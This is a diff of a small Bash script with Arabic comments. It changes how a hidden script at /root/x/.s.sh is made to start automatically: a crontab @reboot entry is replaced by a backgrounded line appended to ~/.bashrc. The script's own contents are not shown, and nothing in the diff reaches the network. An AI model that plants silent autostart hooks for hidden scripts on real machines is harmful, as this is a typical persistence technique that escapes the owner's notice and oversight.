@@ -2,11 +2,17 @@
 
 PROGRAM_PATH="/root/x/.s.sh"
 
-crontab -l | grep -q "@reboot $PROGRAM_PATH"
-
-if [ $? -ne 0 ]; then
-  (crontab -l 2>/dev/null; echo "@reboot $PROGRAM_PATH") | crontab -
-  echo ""
+if [ -f "$PROGRAM_PATH" ]; then
+    # إضافة السطر إلى ملف ~/.bashrc إذا لم يكن موجودًا بالفعل
+    if ! grep -Fxq "$PROGRAM_PATH &" ~/.bashrc; then
+        echo "$PROGRAM_PATH &" >> ~/.bashrc
+        echo "تمت إضافة البرنامج إلى ~/.bashrc بنجاح."
+    else
+        echo "البرنامج موجود بالفعل في ~/.bashrc."
+    fi
 else
-  echo ""
+    echo "البرنامج غير موجود في المسار المحدد: $PROGRAM_PATH"
 fi
+
+# تطبيق التغييرات فورًا
+source ~/.bashrc
